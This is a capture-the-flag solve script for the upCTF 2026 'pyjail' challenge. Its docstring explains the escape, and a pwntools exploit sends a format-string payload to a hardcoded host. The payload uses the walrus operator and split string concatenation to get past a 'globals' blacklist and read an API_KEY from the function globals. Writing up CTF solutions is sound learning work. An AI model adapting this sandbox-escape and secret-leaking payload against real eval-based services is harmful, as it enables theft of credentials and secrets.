#!/usr/bin/env python3
"""
Challenge: pyjail — upCTF 2026
Category:  misc (Python jail escape)
Flag:      upCTF{fmt_str1ng5_4r3nt_0nly_a_C_th1ng-aiHIty3M754f4052}

eval() with __builtins__={}, 66 char limit, builtin name blacklist.
After eval, friend.format(self=self) is called → format string attack.
Use walrus operator to set friend, string concatenation to bypass 'globals' filter.
"""
from pwn import *

HOST, PORT = "46.225.117.62", 30010

# Walrus operator sets `friend` in eval scope (SAFE_GLOBALS)
# String concat '__glo'+'bals__' evades substring check for 'globals'
# format() then resolves {self.__init__.__func__.__globals__[API_KEY]}
payload = "(friend:='{self.__init__.__func__.__glo'+'bals__[API_KEY]}')"

assert len(payload) <= 66, f"Payload too long: {len(payload)}"

s = remote(HOST, PORT)
s.sendline(payload.encode())
flag = s.recvline(timeout=5).decode().strip()
s.close()

log.success(f"FLAG: {flag}")
